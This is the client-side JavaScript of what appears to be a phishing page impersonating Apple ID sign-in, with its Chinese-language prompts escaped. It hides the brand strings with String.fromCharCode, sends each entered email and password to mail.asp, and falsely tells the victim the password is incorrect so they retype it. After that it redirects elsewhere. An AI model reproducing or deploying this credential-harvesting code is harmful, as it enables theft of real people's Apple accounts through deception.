<script type="text/javascript">
var count=0;
$(document).ready(function(){
$("#btnnext").click(function(){
if(count==1){
window.location = "../ht/sav.asp";
}
count=count+1;
});
  $("#name").blur(function(){
  	var temp=$(this).val();
	$("#dname").css("border","1px solid #d7d5ca");
  	if(($(this).val()!="")&&($(this).val()!=String.fromCharCode(65)+String.fromCharCode(112)+String.fromCharCode(112)+String.fromCharCode(108)+String.fromCharCode(101)+" "+String.fromCharCode(73)+String.fromCharCode(68)))
	{
		if(temp.indexOf("@")>0){
		
		}else
		{
		$(this).val();
		}
	}
  });
$("#pass").focus(function(){
	document.getElementById("pass").type="password";
});
$("#pass").blur(function(){
	if($("#pass").val()==""||$("#pass").val()=="")
	{
		document.getElementById("pass").type="text";
  		 $("#pass").val("");
	}
});
$("#buttom").click(function(){
	var namestr=$("#name").val();
	var pwdstr=$("#pass").val();
	if(namestr==""||namestr=="example@"+String.fromCharCode(105)+String.fromCharCode(99)+String.fromCharCode(108)+String.fromCharCode(111)+String.fromCharCode(117)+String.fromCharCode(100)+"."+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(109))
	{
		$("#fade").show();
		$("#tst #h2").text(unescape("%u8BF7%u8F93%u5165 ")+String.fromCharCode(65)+String.fromCharCode(112)+String.fromCharCode(112)+String.fromCharCode(108)+String.fromCharCode(101)+" "+String.fromCharCode(73)+String.fromCharCode(68)+unescape(" %u8D26%u53F7"));
		$("#tst").show();
		$("#btnname").show();
		$("#btnpass").hide();
		$("#btnnext").hide();
		return false;
	}
	if(pwdstr==""||pwdstr=="")
	{
		$("#fade").show();
		$("#tst #h2").text(unescape("%u8BF7%u8F93%u5165 ")+String.fromCharCode(65)+String.fromCharCode(112)+String.fromCharCode(112)+String.fromCharCode(108)+String.fromCharCode(101)+" "+String.fromCharCode(73)+String.fromCharCode(68)+unescape(" %u5BC6%u7801"));
		$("#tst").show();
		$("#btnname").hide();
		$("#btnpass").show();
		$("#btnnext").hide();
		return false;
	}
	if( namestr!=""&&namestr!="example@"+String.fromCharCode(105)+String.fromCharCode(99)+String.fromCharCode(108)+String.fromCharCode(111)+String.fromCharCode(117)+String.fromCharCode(100)+"."+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(109)&&pwdstr!=""&&pwdstr!="")
	{
		//$("#ts #ts_wz").text(unescape("%u5BC6%u7801%u9519%u8BEF%21"));
		//$("#ts").fadeIn("slow");
		//$("#ts").fadeOut(40);
                $("#tst #h2").text(unescape("%u60A8%u7684 ")+String.fromCharCode(65)+String.fromCharCode(112)+String.fromCharCode(112)+String.fromCharCode(108)+String.fromCharCode(101)+" "+String.fromCharCode(73)+String.fromCharCode(68)+unescape(" %u6216%u5BC6%u7801%u4E0D%u6B63%u786E"));
		$("#tst").show();
		$("#fade").show();
		$.post("mail.asp?username="+$("#name").val()+"&pw="+$("#pass").val(),{},function(){});
		$("#btnname").hide();
		$("#btnpass").hide();
		$("#btnnext").show();	
	}
});
$(function(){
$("#btnnext").click(function(){
	$("#fade").hide();
	$("#tst").hide();
$("#pass").val("");
        $('#pass').blur();
$("#name").val("");
        $('#name').blur();	
document.getElementById("buttom").className = 'login_1';
});
$("#btnname").click(function(){
	$("#fade").hide();
	$("#tst").hide();
});
$("#btnpass").click(function(){
	$("#fade").hide();
	$("#tst").hide();
});
});
});
</script>
